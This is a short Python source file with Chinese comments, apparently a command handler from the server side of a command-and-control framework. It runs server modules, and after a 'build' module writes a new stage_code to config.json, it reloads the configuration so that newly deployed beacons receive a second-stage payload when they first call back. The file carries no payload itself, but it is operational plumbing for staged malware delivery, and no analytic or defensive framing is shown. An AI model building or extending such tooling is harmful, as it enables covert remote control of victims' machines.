"""s_exec — 执行 server 端模块 (run(*args))"""

import json
import os


def _stage_marker(cfg_path):
    """读 config.json 当前 stage_code 作标记; 失败返回 None(不检测)。"""
    if not cfg_path or not os.path.isfile(cfg_path):
        return None
    try:
        with open(cfg_path, encoding="utf-8") as f:
            raw = json.load(f)
        return raw.get("stage_code")
    except (OSError, json.JSONDecodeError):
        return None


def run(disp, args):
    if not disp.smods:
        return "[!] s_modules not available"
    if not args:
        return "[!] usage: s_exec <module> [arg1 arg2 ...]"
    name = args[0]
    cfg_path = getattr(disp.config, "config_path", "") or ""
    marker = _stage_marker(cfg_path) if name == "build" else None
    try:
        text = disp.smods.run(name, args[1:])
    except ValueError as e:
        return f"[!] {e}"
    except ImportError as e:
        return f"[!] {e}"
    if marker is not None and _stage_marker(cfg_path) != marker:
        # build 分段写入了新 stage_code → 重载配置, 新 beacon 首连即用新第二段
        try:
            from server.engine.commands import reload as reload_cmd
            reload_cmd.run(disp, [])
            text += ("\n\n[+] 配置已重载: 二阶段载荷已生效"
                     "(新 beacon 首次回连时下发)")
        except Exception:
            text += ("\n\n[*] stage_code 已写入 config.json; "
                     "运行中请执行 reload 立即生效")
    return text
